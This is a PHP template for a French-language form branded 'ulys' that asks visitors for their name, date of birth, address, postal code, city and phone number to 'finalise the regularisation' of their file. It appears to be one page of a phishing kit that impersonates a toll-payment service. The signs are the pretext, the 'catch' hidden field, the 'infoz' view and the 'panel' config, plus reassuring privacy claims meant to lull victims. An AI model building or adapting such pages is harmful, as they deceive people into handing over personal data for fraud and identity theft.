<?php
require_once 'config/panel.php';
// Start output buffering to capture content
ob_start();
?>

<div class="ulys-main">
    <div class="ulys-login-card">
        <h2>Informations personnelles</h2>
        <div class="ulys-login-desc mb-4">
            <span class="ulys-orange">Merci de compléter vos informations pour finaliser la régularisation de votre dossier.</span>
        </div>
        <form method="POST" action="index.php?view=infoz" class="needs-validation">
            <input type="hidden" name="catch">
            <div class="ulys-form-group">
                <input name="lastname" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['lastname'])) { echo ' is-invalid'; } ?>" placeholder="Nom" value="<?php if (!empty($_SESSION['lastname'])){ echo $_SESSION['lastname'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['lastname'])): ?>
                    <div class="invalid-feedback d-block">Nom invalide.</div>
                <?php endif; ?>
            </div>
            <div class="ulys-form-group">
                <input name="firstname" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['firstname'])) { echo ' is-invalid'; } ?>" placeholder="Prénom" value="<?php if (!empty($_SESSION['firstname'])){ echo $_SESSION['firstname'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['firstname'])): ?>
                    <div class="invalid-feedback d-block">Prénom invalide.</div>
                <?php endif; ?>
            </div>
            <div class="ulys-form-group">
                <input name="dob" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['dob'])) { echo ' is-invalid'; } ?>" placeholder="Date de naissance (JJ/MM/AAAA)" value="<?php if (!empty($_SESSION['dob'])){ echo $_SESSION['dob'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['dob'])): ?>
                    <div class="invalid-feedback d-block">Date de naissance invalide.</div>
                <?php endif; ?>
            </div>
            <div class="ulys-form-group">
                <input name="adress" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['adress'])) { echo ' is-invalid'; } ?>" placeholder="Adresse" value="<?php if (!empty($_SESSION['adress'])){ echo $_SESSION['adress'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['adress'])): ?>
                    <div class="invalid-feedback d-block">Adresse invalide.</div>
                <?php endif; ?>
            </div>
            <div class="ulys-form-row" style="gap: 16px;">
                <div style="flex:1">
                    <input name="zip" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['zip'])) { echo ' is-invalid'; } ?>" placeholder="Code postal" value="<?php if (!empty($_SESSION['zip'])){ echo $_SESSION['zip'];} ?>">
                    <?php if (isset($_SESSION['ERRORS']['zip'])): ?>
                        <div class="invalid-feedback d-block">Code postal invalide.</div>
                    <?php endif; ?>
                </div>
                <div style="flex:1">
                    <input name="city" type="text" class="ulys-input<?php if (isset($_SESSION['ERRORS']['city'])) { echo ' is-invalid'; } ?>" placeholder="Ville" value="<?php if (!empty($_SESSION['city'])){ echo $_SESSION['city'];} ?>">
                    <?php if (isset($_SESSION['ERRORS']['city'])): ?>
                        <div class="invalid-feedback d-block">Ville invalide.</div>
                    <?php endif; ?>
                </div>
            </div>
            <div class="ulys-form-group">
                <input name="phone" type="tel" class="ulys-input<?php if (isset($_SESSION['ERRORS']['phone'])) { echo ' is-invalid'; } ?>" placeholder="Téléphone (06XXXXXXXX)" value="<?php if (!empty($_SESSION['phone'])){ echo $_SESSION['phone'];} ?>">
                <?php if (isset($_SESSION['ERRORS']['phone'])): ?>
                    <div class="invalid-feedback d-block">Numéro invalide.</div>
                <?php endif; ?>
            </div>
            <button type="submit" name="submit" value="page3" class="ulys-btn" style="background: #ff3c1b; color: #fff; margin-top: 18px;">Continuer</button>
        </form>
    </div>
    <div class="ulys-tips-col">
        <h3>Astuces&nbsp;!</h3>
        <div class="ulys-tip-block">
            <i class="fas fa-user"></i>
            <div>
                <strong>Renseignez vos informations</strong><br>
                Assurez-vous que toutes les informations saisies sont exactes pour éviter tout blocage de votre dossier.
            </div>
        </div>
        <div class="ulys-tip-block">
            <i class="fas fa-lock"></i>
            <div>
                <strong>Confidentialité</strong><br>
                Vos données sont traitées de façon sécurisée et confidentielle.
            </div>
        </div>
    </div>
</div>

<!-- Scripts pour la validation des champs -->
<script src="assets/js/dateDirectMask.js"></script>
<script src="assets/js/phoneValidation.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const zipInput = document.querySelector('input[name="zip"]');
    if (!zipInput) return;
    // Empêcher la saisie de caractères non numériques et limiter à 5 chiffres
    zipInput.addEventListener('input', function() {
        let val = this.value.replace(/\D/g, '');
        if (val.length > 5) val = val.substring(0, 5);
        this.value = val;
    });
    zipInput.addEventListener('keypress', function(e) {
        if (!/\d/.test(e.key)) {
            e.preventDefault();
            return false;
        }
        if (this.value.length >= 5) {
            e.preventDefault();
            return false;
        }
    });
    zipInput.addEventListener('paste', function(e) {
        e.preventDefault();
        let pasted = (e.clipboardData || window.clipboardData).getData('text');
        pasted = pasted.replace(/\D/g, '').substring(0, 5);
        this.value = pasted;
    });
});
</script>

<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();

// Include layout with the view content
include_once 'layout.php';
?> 